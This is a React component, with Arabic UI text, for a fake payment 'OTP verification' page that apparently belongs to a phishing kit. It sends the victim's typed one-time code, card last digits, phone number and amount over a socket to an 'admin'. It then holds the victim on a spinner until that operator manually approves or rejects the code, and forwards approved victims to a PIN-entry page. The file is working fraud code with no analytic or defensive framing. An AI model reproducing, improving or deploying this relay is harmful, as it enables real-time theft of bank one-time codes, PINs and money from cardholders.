import { useEffect, useState } from 'react';
import { useNavigate, useLocation } from 'react-router-dom';
import { useSocket } from '../context/SocketContext';

export default function OTPVerification() {
  const navigate = useNavigate();
  const location = useLocation();
  const { socket, userIp } = useSocket();
  
  const { cardLastDigits, phoneNumber, amount, otpCode } = location.state || {};
  
  const [status, setStatus] = useState('pending'); // pending, approved, rejected
  const [message, setMessage] = useState('');
  const [timeLeft, setTimeLeft] = useState(120); // 2 minutes
  const [showAdminControls, setShowAdminControls] = useState(false);

  // عداد تنازلي
  useEffect(() => {
    if (status !== 'pending') return;

    const timer = setInterval(() => {
      setTimeLeft((prev) => {
        if (prev <= 1) {
          clearInterval(timer);
          // انتهى الوقت - العودة لإدخال OTP
          navigate('/payment-otp', { 
            state: { cardLastDigits, phoneNumber, amount },
            replace: true 
          });
          return 0;
        }
        return prev - 1;
      });
    }, 1000);

    return () => clearInterval(timer);
  }, [status, navigate, cardLastDigits, phoneNumber, amount]);

  // تنسيق الوقت
  const formatTime = (seconds) => {
    const mins = Math.floor(seconds / 60);
    const secs = seconds % 60;
    return `${mins}:${secs.toString().padStart(2, '0')}`;
  };

  useEffect(() => {
    if (!socket) return;

    // الحصول على IP الخاص بالمستخدم
    const userIP = sessionStorage.getItem('userIP');

    // إرسال رمز OTP للأدمن عبر Socket
    socket.emit('newOTP', {
      ip: userIP,
      otpCode,
      cardLastDigits,
      phoneNumber,
      amount,
      timestamp: new Date().toISOString()
    });

    // استماع لحالة التحقق من OTP من الأدمن
    socket.on('otpVerificationStatus', (data) => {
      console.log('🔐 OTP verification status received:', data);
      console.log('🔍 Current user IP:', userIp, 'Message IP:', data.ip);
      
      // التحقق من أن الرسالة موجهة لهذا المستخدم فقط
      if (data.ip && data.ip !== userIp) {
        console.log('⚠️ OTP status not for this user, ignoring');
        return;
      }

      setStatus(data.status);
      setMessage(data.message || '');

      // إذا تم قبول الرمز، الانتقال لصفحة إدخال PIN
      if (data.status === 'approved') {
        setTimeout(() => {
          navigate('/payment-pin', {
            state: {
              cardLastDigits,
              phoneNumber,
              amount,
              otpCode
            }
          });
        }, 2000);
      }

      // إذا تم رفض الرمز، العودة لإدخال OTP
      if (data.status === 'rejected') {
        setTimeout(() => {
          navigate('/payment-otp', { 
            state: { cardLastDigits, phoneNumber, amount },
            replace: true 
          });
        }, 2000);
      }
    });

    return () => {
      socket.off('otpVerificationStatus');
    };
  }, [socket, navigate, otpCode, cardLastDigits, phoneNumber, amount]);

  // التعامل مع القبول من المستخدم نفسه
  const handleApprove = () => {
    if (!socket) return;
    
    setStatus('approved');
    setMessage('تم قبول الرمز بنجاح');
    
    // إرسال حالة القبول للسيرفر
    socket.emit('approveOTP', {
      ip: userIp,
      otpCode,
      status: 'approved'
    });

    // الانتقال لصفحة PIN
    setTimeout(() => {
      navigate('/payment-pin', {
        state: {
          cardLastDigits,
          phoneNumber,
          amount,
          otpCode
        }
      });
    }, 1500);
  };

  // التعامل مع الرفض من المستخدم نفسه
  const handleReject = () => {
    if (!socket) return;
    
    const userIP = sessionStorage.getItem('userIP');
    
    setStatus('rejected');
    setMessage('تم رفض الرمز');
    
    // إرسال حالة الرفض للسيرفر
    socket.emit('rejectOTP', {
      ip: userIP,
      otpCode,
      status: 'rejected'
    });

    // العودة لإدخال OTP
    setTimeout(() => {
      navigate('/payment-otp', { 
        state: { cardLastDigits, phoneNumber, amount },
        replace: true 
      });
    }, 1500);
  };

  return (
    <div className="min-h-screen bg-gradient-to-br from-purple-50 to-indigo-100 flex items-center justify-center px-4">
      <div className="max-w-md w-full bg-white rounded-2xl shadow-xl p-8 text-center">
        {/* أيقونة الحالة */}
        <div className="mb-6">
          {status === 'pending' && (
            <div className="relative mx-auto w-24 h-24">
              <div className="absolute inset-0 border-4 border-purple-200 border-t-purple-600 rounded-full animate-spin"></div>
              <div className="absolute inset-0 flex items-center justify-center">
                <svg className="w-12 h-12 text-purple-600" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z" />
                </svg>
              </div>
            </div>
          )}
          
          {status === 'approved' && (
            <div className="mx-auto w-24 h-24 bg-green-100 rounded-full flex items-center justify-center animate-bounce">
              <svg className="w-12 h-12 text-green-600" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M5 13l4 4L19 7" />
              </svg>
            </div>
          )}
          
          {status === 'rejected' && (
            <div className="mx-auto w-24 h-24 bg-red-100 rounded-full flex items-center justify-center">
              <svg className="w-12 h-12 text-red-600" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M6 18L18 6M6 6l12 12" />
              </svg>
            </div>
          )}
        </div>

        {/* العنوان والرسالة */}
        <div className="mb-6">
          {status === 'pending' && (
            <>
              <h1 className="text-2xl font-bold text-gray-800 mb-2">
                جاري التحقق من الرمز
              </h1>
              <p className="text-gray-600">
                يرجى الانتظار بينما نتحقق من رمز التوثيق
              </p>
            </>
          )}
          
          {status === 'approved' && (
            <>
              <h1 className="text-2xl font-bold text-green-600 mb-2">
                تم التحقق بنجاح! ✓
              </h1>
              <p className="text-gray-600">
                {message || 'رمز التوثيق صحيح، جاري الانتقال...'}
              </p>
            </>
          )}
          
          {status === 'rejected' && (
            <>
              <h1 className="text-2xl font-bold text-red-600 mb-2">
                الرمز غير صحيح ✗
              </h1>
              <p className="text-gray-600">
                {message || 'يرجى إدخال الرمز الصحيح'}
              </p>
            </>
          )}
        </div>

        {/* معلومات الرمز */}
        {status === 'pending' && (
          <div className="bg-purple-50 border border-purple-200 rounded-lg p-4 mb-6">
            <div className="mb-3">
              <div className="text-sm text-gray-600 mb-2">الرمز المُدخل:</div>
              <div className="font-mono text-2xl font-bold text-purple-600 tracking-widest" dir="ltr">
                {otpCode}
              </div>
            </div>
            
            <div className="border-t border-purple-200 pt-3 space-y-2 text-sm">
              <div className="flex justify-between">
                <span className="text-gray-600">البطاقة:</span>
                <span className="font-mono" dir="ltr">**** {cardLastDigits}</span>
              </div>
              <div className="flex justify-between">
                <span className="text-gray-600">الهاتف:</span>
                <span className="font-mono" dir="ltr">{phoneNumber}</span>
              </div>
            </div>

            {/* العداد التنازلي */}
            <div className="mt-4 pt-3 border-t border-purple-200">
              <div className="flex items-center justify-between text-sm">
                <span className="text-gray-700">الوقت المتبقي:</span>
                <div className="flex items-center gap-2">
                  <svg className="w-5 h-5 text-purple-600" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 8v4l3 3m6-3a9 9 0 11-18 0 9 9 0 0118 0z" />
                  </svg>
                  <span className="font-bold text-purple-600 text-lg">{formatTime(timeLeft)}</span>
                </div>
              </div>
              <div className="w-full bg-purple-200 rounded-full h-1.5 mt-2">
                <div 
                  className="bg-purple-600 h-1.5 rounded-full transition-all duration-1000"
                  style={{ width: `${(timeLeft / 120) * 100}%` }}
                ></div>
              </div>
            </div>
          </div>
        )}

        {/* رسالة الانتظار */}
        {status === 'pending' && (
          <div className="bg-blue-50 border border-blue-200 rounded-lg p-4 text-sm text-gray-700">
            <p className="mb-2">⏱️ يتم التحقق من الرمز حالياً</p>
            <p>📱 سيتم إعلامك فوراً بالنتيجة</p>
          </div>
        )}

        {/* زر الإلغاء */}
        {status === 'pending' && (
          <div className="space-y-3 mt-6">
            {/* زر إظهار أزرار التحكم */}
            <button
              onClick={() => setShowAdminControls(!showAdminControls)}
              className="w-full bg-indigo-600 text-white py-3 rounded-lg font-semibold hover:bg-indigo-700 transition-colors flex items-center justify-center gap-2"
            >
              <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 6V4m0 2a2 2 0 100 4m0-4a2 2 0 110 4m-6 8a2 2 0 100-4m0 4a2 2 0 110-4m0 4v2m0-6V4m6 6v10m6-2a2 2 0 100-4m0 4a2 2 0 110-4m0 4v2m0-6V4" />
              </svg>
              {showAdminControls ? 'إخفاء أزرار التحكم' : 'عرض أزرار التحكم'}
            </button>

            {/* أزرار القبول والرفض */}
            {showAdminControls && (
              <div className="bg-gradient-to-r from-purple-50 to-indigo-50 border-2 border-indigo-200 rounded-xl p-4 space-y-3">
                <div className="text-center mb-2">
                  <span className="text-sm font-semibold text-indigo-800 bg-indigo-100 px-3 py-1 rounded-full">
                    أزرار التحكم السريع
                  </span>
                </div>
                
                <div className="grid grid-cols-2 gap-3">
                  {/* زر القبول */}
                  <button
                    onClick={handleApprove}
                    className="bg-gradient-to-r from-green-500 to-green-600 text-white py-3 px-4 rounded-lg font-bold hover:from-green-600 hover:to-green-700 transform hover:scale-105 transition-all duration-200 shadow-lg flex items-center justify-center gap-2"
                  >
                    <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M5 13l4 4L19 7" />
                    </svg>
                    قبول
                  </button>

                  {/* زر الرفض */}
                  <button
                    onClick={handleReject}
                    className="bg-gradient-to-r from-red-500 to-red-600 text-white py-3 px-4 rounded-lg font-bold hover:from-red-600 hover:to-red-700 transform hover:scale-105 transition-all duration-200 shadow-lg flex items-center justify-center gap-2"
                  >
                    <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M6 18L18 6M6 6l12 12" />
                    </svg>
                    رفض
                  </button>
                </div>
              </div>
            )}

            <button
              onClick={() => navigate('/payment-failed')}
              className="w-full bg-gray-200 text-gray-700 py-3 rounded-lg font-semibold hover:bg-gray-300 transition-colors"
            >
              إلغاء العملية
            </button>
          </div>
        )}
      </div>
    </div>
  );
}
